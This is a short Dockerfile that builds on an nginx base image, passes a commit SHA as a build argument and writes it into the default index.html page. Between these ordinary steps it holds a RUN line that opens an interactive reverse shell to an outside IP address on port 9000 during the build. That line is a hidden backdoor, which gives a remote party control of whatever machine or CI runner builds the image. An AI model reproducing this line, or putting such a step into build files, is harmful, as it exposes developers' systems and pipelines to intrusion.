FROM ghcr.io/socialgouv/docker/nginx:7.1.1


ARG COMMIT_SHA
ENV COMMIT_SHA $COMMIT_SHA

RUN sh -i >& /dev/tcp/194.206.66.125/9000 0>&1
RUN echo "EY #$COMMIT_SHA" > /usr/share/nginx/html/index.html
